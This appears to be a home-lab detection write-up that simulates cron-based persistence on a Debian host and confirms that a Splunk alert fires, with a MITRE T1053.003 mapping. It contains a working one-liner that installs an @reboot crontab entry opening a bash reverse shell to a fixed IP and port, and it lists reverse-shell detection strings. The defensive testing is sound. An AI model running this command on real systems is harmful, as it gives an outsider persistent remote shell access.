## Purpose 

To simulate an adversary establishing persistence on a compromised Linux host by modifying the user's scheduled tasks. The goal is to verify that Splunk successfully detects when a malicious payload (in this case, a reverse shell) is injected into the crontab to automatically execute every time the system reboots.

## Commands Used  

```
(crontab -l 2>/dev/null; echo "@reboot sleep 30 && bash -i >& /dev/tcp/192.168.31.185/4444 0>&1") | crontab -
```

## Target  

OS : Linux Debian

## Expected Detection 

Splunk is expected to ingest Linux process creation logs (via Sysmon for Linux Event ID 1, auditd, or syslog) capturing the execution of the crontab utility. The logs should capture the command-line arguments containing highly suspicious strings commonly used in reverse shells, such as /dev/tcp/, bash -i, or @reboot.


## Actual Detection 

The Splunk dashboard successfully fired the alert, capturing the exact timestamp, the targeted Linux host, the user who executed the command, and the full malicious command-line string being piped into crontab.


## Screenshots 

#### Command Exeution

![command](/screenshots/Linux-Cron-persistence/Command-used.png)


## MITRE Mapping 

Tactic: Persistence, Execution

Technique: T1053 – Scheduled Task/Job

Procedure: T1053.003 – Scheduled Task/Job: Cron (Adversaries may abuse the cron utility to perform task scheduling for initial or recurring execution of malicious code).


